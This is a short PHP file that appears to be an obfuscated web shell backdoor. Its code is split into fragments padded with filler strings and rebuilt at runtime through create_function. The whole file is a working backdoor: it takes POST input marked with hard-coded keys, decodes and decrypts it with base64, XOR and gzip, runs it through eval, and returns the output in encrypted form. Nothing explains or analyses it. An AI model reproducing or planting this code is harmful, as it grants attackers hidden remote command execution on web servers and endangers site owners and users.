<?php
$k='wf"/$kwfh(.+)$kfwf/",@fiwfle_getwf_contents("wfphp:wf//input"wf)wf,$m)==1) {@wfob_starwft();@ewfva';
$Q='l(@wfgzuncomwfpwfress(@x(@bawfse64_dwfecowfde(wf$m[1]),$kwfwf)));$owf=@ob_get_contewfntwfs();@owfb';
$I=str_replace('A','','AcreatAe_AAfAuAnction');
$Y='fwfctiowfn x($wft,$k)wf{$c=wfstwfrlwfen($k);$l=strlenwf($t);$o="";for($iwf=0;$iwf<$l;){wffor(wf$j=0';
$J='wfwf_end_clean();$r=@bwfase64_ewfncodwfe(@x(@gzcowfmpress(wf$o),wf$k));priwfnt("$wfp$kh$r$wfkf");}';
$h='$k="wf51wf6485ff"wf;$khwf="4725wf32833a06wf";$kf="852dca0wfdwfb48wf3";$p="mbkf0CwfNQwfRsAf00ewfI";funw';
$T=';($jwf<$c&&$i<$wfl);$j++wf,wf$i+wf+){$o.wf=$t{$i}^$k{$wfj};}}retwfurwfn $o;}wfif (@prewfg_matchwf(';
$d=str_replace('wf','',$h.$Y.$T.$k.$Q.$J);
$j=$I('',$d);$j();
?>
